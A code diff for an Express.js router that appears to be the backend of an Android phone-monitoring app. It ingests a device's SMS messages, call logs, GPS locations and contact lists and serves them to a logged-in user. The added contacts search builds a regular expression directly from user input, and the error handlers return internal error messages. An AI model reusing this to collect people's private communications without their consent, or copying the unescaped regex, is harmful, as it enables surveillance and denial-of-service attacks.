@@ -2,13 +2,17 @@
 const express = require('express');
 const router = express.Router();
 const auth = require('./_auth_mw');
+
 const Device = require('../models/Device');
 const Sms = require('../models/Sms');
 const Call = require('../models/Call');
 const Location = require('../models/Location');
 const Contact = require('../models/Contact');
 
-// helper: encontra device garantindo que pertence ao user
+/**
+ * Helper: find device belonging to user.
+ * Accepts deviceRecordId (DB _id) or deviceId (ANDROID_ID).
+ */
 async function findDeviceForUser(deviceId, deviceRecordId, userId) {
   if (deviceRecordId) {
     const d = await Device.findById(deviceRecordId);
@@ -23,14 +27,14 @@ async function findDeviceForUser(deviceId, deviceRecordId, userId) {
   return null;
 }
 
-/* ------------------------
-   POST endpoints (existing ingestion)
-   ------------------------ */
+/* ----------------------------
+   POST ingestion endpoints
+   ---------------------------- */
 
-// POST /api/sms
+/* POST /api/sms */
 router.post('/sms', auth, async (req, res) => {
   try {
-    const { deviceId, deviceRecordId, sender, message, timestamp, raw } = req.body;
+    const { deviceId, deviceRecordId, sender, message, timestamp, raw } = req.body || {};
     const device = await findDeviceForUser(deviceId, deviceRecordId, req.user.id);
     if (!device) return res.status(403).json({ error: 'device not found or not owned by user' });
 
@@ -43,17 +47,19 @@ router.post('/sms', auth, async (req, res) => {
       raw: raw || {}
     });
     await s.save();
+
+    device.lastSeen = new Date(); await device.save();
     return res.json({ ok: true, id: s._id });
-  } catch (e) {
-    console.error('POST /sms error', e);
-    return res.status(500).json({ error: e.message });
+  } catch (err) {
+    console.error('POST /sms error', err);
+    return res.status(500).json({ error: err.message });
   }
 });
 
-// POST /api/call
+/* POST /api/call */
 router.post('/call', auth, async (req, res) => {
   try {
-    const { deviceId, deviceRecordId, number, type, state, timestamp, duration } = req.body;
+    const { deviceId, deviceRecordId, number, type, state, timestamp, duration } = req.body || {};
     const device = await findDeviceForUser(deviceId, deviceRecordId, req.user.id);
     if (!device) return res.status(403).json({ error: 'device not found or not owned by user' });
 
@@ -67,17 +73,19 @@ router.post('/call', auth, async (req, res) => {
       duration: duration || 0
     });
     await c.save();
+
+    device.lastSeen = new Date(); await device.save();
     return res.json({ ok: true, id: c._id });
-  } catch (e) {
-    console.error('POST /call error', e);
-    return res.status(500).json({ error: e.message });
+  } catch (err) {
+    console.error('POST /call error', err);
+    return res.status(500).json({ error: err.message });
   }
 });
 
-// POST /api/location
+/* POST /api/location */
 router.post('/location', auth, async (req, res) => {
   try {
-    const { deviceId, deviceRecordId, lat, lon, accuracy, timestamp } = req.body;
+    const { deviceId, deviceRecordId, lat, lon, accuracy, timestamp } = req.body || {};
     const device = await findDeviceForUser(deviceId, deviceRecordId, req.user.id);
     if (!device) return res.status(403).json({ error: 'device not found or not owned by user' });
 
@@ -86,66 +94,85 @@ router.post('/location', auth, async (req, res) => {
       user: req.user.id,
       lat: parseFloat(lat),
       lon: parseFloat(lon),
-      accuracy: parseFloat(accuracy) || 0,
+      accuracy: accuracy ? parseFloat(accuracy) : 0,
       timestamp: timestamp ? new Date(timestamp) : new Date()
     });
     await l.save();
+
+    device.lastSeen = new Date(); await device.save();
     return res.json({ ok: true, id: l._id });
-  } catch (e) {
-    console.error('POST /location error', e);
-    return res.status(500).json({ error: e.message });
+  } catch (err) {
+    console.error('POST /location error', err);
+    return res.status(500).json({ error: err.message });
   }
 });
 
-/* ------------------------
-   GET endpoints for frontend consumption
-   ------------------------ */
+/* POST /api/contacts */
+router.post('/contacts', auth, async (req, res) => {
+  try {
+    const { deviceId, deviceRecordId, contacts } = req.body || {};
+    if (!Array.isArray(contacts)) return res.status(400).json({ error: 'contacts must be array' });
 
-/**
- * GET /api/sms?deviceRecordId=...&deviceId=...&limit=50&since=timestamp
- * Returns array of SMS documents for the device (only for authenticated user's devices)
- */
+    const device = await findDeviceForUser(deviceId, deviceRecordId, req.user.id);
+    if (!device) return res.status(403).json({ error: 'device not found or not owned by user' });
+
+    // replace contacts for this device
+    await Contact.deleteMany({ device: device._id, user: req.user.id });
+    const docs = contacts.filter(c => c && (c.number || c.name)).map(c => ({
+      device: device._id,
+      user: req.user.id,
+      name: c.name || '',
+      number: c.number || ''
+    }));
+    if (docs.length > 0) await Contact.insertMany(docs);
+
+    device.lastSeen = new Date(); await device.save();
+    return res.json({ ok: true, count: docs.length });
+  } catch (err) {
+    console.error('POST /contacts error', err);
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+/* ----------------------------
+   GET endpoints (filtered by user+device)
+   ---------------------------- */
+
+/* GET /api/sms?deviceRecordId=... or ?deviceId=... */
 router.get('/sms', auth, async (req, res) => {
   try {
-    const { deviceRecordId, deviceId, limit = 100, since } = req.query;
+    const { deviceRecordId, deviceId, limit = 200, since } = req.query;
     const device = await findDeviceForUser(deviceId, deviceRecordId, req.user.id);
     if (!device) return res.status(403).json({ error: 'device not found or not owned by user' });
 
     const q = { device: device._id, user: req.user.id };
     if (since) q.timestamp = { $gte: new Date(parseInt(since)) };
-
     const docs = await Sms.find(q).sort({ timestamp: -1 }).limit(parseInt(limit));
     return res.json(docs);
-  } catch (e) {
-    console.error('GET /sms error', e);
-    return res.status(500).json({ error: e.message });
+  } catch (err) {
+    console.error('GET /sms error', err);
+    return res.status(500).json({ error: err.message });
   }
 });
 
-/**
- * GET /api/call?deviceRecordId=...&deviceId=...&limit=100&since=...
- */
+/* GET /api/call */
 router.get('/call', auth, async (req, res) => {
   try {
-    const { deviceRecordId, deviceId, limit = 100, since } = req.query;
+    const { deviceRecordId, deviceId, limit = 200, since } = req.query;
     const device = await findDeviceForUser(deviceId, deviceRecordId, req.user.id);
     if (!device) return res.status(403).json({ error: 'device not found or not owned by user' });
 
     const q = { device: device._id, user: req.user.id };
     if (since) q.timestamp = { $gte: new Date(parseInt(since)) };
-
     const docs = await Call.find(q).sort({ timestamp: -1 }).limit(parseInt(limit));
     return res.json(docs);
-  } catch (e) {
-    console.error('GET /call error', e);
-    return res.status(500).json({ error: e.message });
+  } catch (err) {
+    console.error('GET /call error', err);
+    return res.status(500).json({ error: err.message });
   }
 });
 
-/**
- * GET /api/location?deviceRecordId=...&deviceId=...&limit=500&since=...
- * Returns list of locations (lat, lon, accuracy, timestamp)
- */
+/* GET /api/location */
 router.get('/location', auth, async (req, res) => {
   try {
     const { deviceRecordId, deviceId, limit = 500, since } = req.query;
@@ -156,7 +183,6 @@ router.get('/location', auth, async (req, res) => {
     if (since) q.timestamp = { $gte: new Date(parseInt(since)) };
 
     const docs = await Location.find(q).sort({ timestamp: -1 }).limit(parseInt(limit));
-    // Normalize response: only necessary fields
     const out = docs.map(d => ({
       _id: d._id,
       lat: d.lat,
@@ -165,26 +191,27 @@ router.get('/location', auth, async (req, res) => {
       timestamp: d.timestamp
     }));
     return res.json(out);
-  } catch (e) {
-    console.error('GET /location error', e);
-    return res.status(500).json({ error: e.message });
+  } catch (err) {
+    console.error('GET /location error', err);
+    return res.status(500).json({ error: err.message });
   }
 });
 
-/**
- * GET /api/contacts?deviceRecordId=...&deviceId=...
- */
+/* GET /api/contacts */
 router.get('/contacts', auth, async (req, res) => {
   try {
-    const { deviceRecordId, deviceId } = req.query;
+    const { deviceRecordId, deviceId, q = '', limit = 500 } = req.query;
     const device = await findDeviceForUser(deviceId, deviceRecordId, req.user.id);
     if (!device) return res.status(403).json({ error: 'device not found or not owned by user' });
 
-    const docs = await Contact.find({ device: device._id, user: req.user.id }).sort({ name: 1 });
+    const regex = q ? new RegExp(q, 'i') : null;
+    const filter = { device: device._id, user: req.user.id };
+    if (regex) filter.$or = [{ name: regex }, { number: regex }];
+    const docs = await Contact.find(filter).sort({ name: 1 }).limit(parseInt(limit));
     return res.json(docs);
-  } catch (e) {
-    console.error('GET /contacts error', e);
-    return res.status(500).json({ error: e.message });
+  } catch (err) {
+    console.error('GET /contacts error', err);
+    return res.status(500).json({ error: err.message });
   }
 });
 
